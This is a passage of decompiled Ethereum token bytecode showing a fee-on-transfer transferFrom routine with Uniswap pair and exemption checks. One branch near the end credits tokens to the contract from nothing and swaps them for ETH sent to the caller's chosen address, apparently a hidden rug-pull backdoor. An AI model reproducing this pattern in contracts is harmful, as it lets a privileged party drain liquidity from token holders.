                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor7:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor13[address(arg2)]:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if arg3 and _taxFee > -1 / arg3:
                                        revert with 'NH{q', 17
                                    if arg3 < arg3 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3 * _taxFee / 100
                                    if balanceOf[0] > -(arg3 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg3 * _taxFee / 100
                                    if balanceOf[address(arg1)] < arg3 - (arg3 * _taxFee / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * _taxFee / 100)
                                    if balanceOf[address(arg2)] > -arg3 + (arg3 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _taxFee / 100)
                                    emit Transfer((arg3 - (arg3 * _taxFee / 100)), arg1, arg2);
        if allowance[address(arg1)][address(msg.sender)] < arg3:
            revert with 'NH{q', 17
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    else:
        if stor13[address(arg1)] <= stor6:
            if stor13[address(arg1)] <= 0:
                if _taxFee <= 0:
                    if balanceOf[address(arg1)] < arg3:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] -= arg3
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if stor13[address(arg1)]:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor7:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor13[address(arg2)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if arg3 and _taxFee > -1 / arg3:
                                    revert with 'NH{q', 17
                                if arg3 < arg3 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[address(arg1)] < arg3 * _taxFee / 100:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3 * _taxFee / 100
                                if balanceOf[0] > -(arg3 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg3 * _taxFee / 100
                                if balanceOf[address(arg1)] < arg3 - (arg3 * _taxFee / 100):
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * _taxFee / 100)
                                if balanceOf[address(arg2)] > -arg3 + (arg3 * _taxFee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _taxFee / 100)
                                emit Transfer((arg3 - (arg3 * _taxFee / 100)), arg1, arg2);
            else:
                if arg2 == uniswapV2PairAddress:
                    if _taxFee <= 0:
                        if balanceOf[address(arg1)] < arg3:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] -= arg3
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if stor13[address(arg1)]:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor7:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor13[address(arg2)]:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if arg3 and _taxFee > -1 / arg3:
                                        revert with 'NH{q', 17
                                    if arg3 < arg3 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(arg1)] < arg3 * _taxFee / 100:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3 * _taxFee / 100
                                    if balanceOf[0] > -(arg3 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg3 * _taxFee / 100
                                    if balanceOf[address(arg1)] < arg3 - (arg3 * _taxFee / 100):
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * _taxFee / 100)
                                    if balanceOf[address(arg2)] > -arg3 + (arg3 * _taxFee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _taxFee / 100)
                                    emit Transfer((arg3 - (arg3 * _taxFee / 100)), arg1, arg2);
                else:
                    if arg3 > stor6:
                        stor13[address(arg2)] = arg3
                    else:
                        if _taxFee <= 0:
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if stor13[address(arg1)]:
                                if balanceOf[address(arg1)] < arg3:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] -= arg3
                                if balanceOf[address(arg2)] > -arg3 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg2)] += arg3
                                emit Transfer(arg3, arg1, arg2);
                            else:
                                if stor7:
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                else:
                                    if stor13[address(arg2)]:
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                    else:
                                        if arg3 and _taxFee > -1 / arg3:
                                            revert with 'NH{q', 17
                                        if arg3 < arg3 * _taxFee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(arg1)] < arg3 * _taxFee / 100:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3 * _taxFee / 100
                                        if balanceOf[0] > -(arg3 * _taxFee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg3 * _taxFee / 100
                                        if balanceOf[address(arg1)] < arg3 - (arg3 * _taxFee / 100):
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * _taxFee / 100)
                                        if balanceOf[address(arg2)] > -arg3 + (arg3 * _taxFee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _taxFee / 100)
                                        emit Transfer((arg3 - (arg3 * _taxFee / 100)), arg1, arg2);
            if allowance[address(arg1)][address(msg.sender)] < arg3:
                revert with 'NH{q', 17
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
        else:
            if balanceOf[address(this.address)] > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(this.address)] += arg3
            mem[128] = this.address
            staticcall routerAddress.WETH() with:
                    gas gas_remaining wei
            mem[192] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[160] = ext_call.return_data[12 len 20]
            if not this.address:
                revert with 0, 'ERC20: approve from the zero address'
            if not routerAddress:
                revert with 0, 'ERC20: approve from the zero address'
            allowance[address(this.address)][stor8] = arg3
            emit Approval(arg3, this.address, routerAddress);
            mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 196] = arg3
            idx = 0
            s = 128
            t = ceil32(return_data.size) + 388
            while idx < 2:
                mem[t] = mem[s + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(routerAddress)
            call routerAddress.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args arg3, 0, 160, address(arg2), block.timestamp, 2, mem[ceil32(return_data.size) + 388 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            if allowance[address(arg1)][address(msg.sender)] < arg3:
                revert with 'NH{q', 17
            if not arg1:
                revert with 0, 'ERC20: approve from the zero address'
            if not msg.sender:
                revert with 0, 'ERC20: approve from the zero address'
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
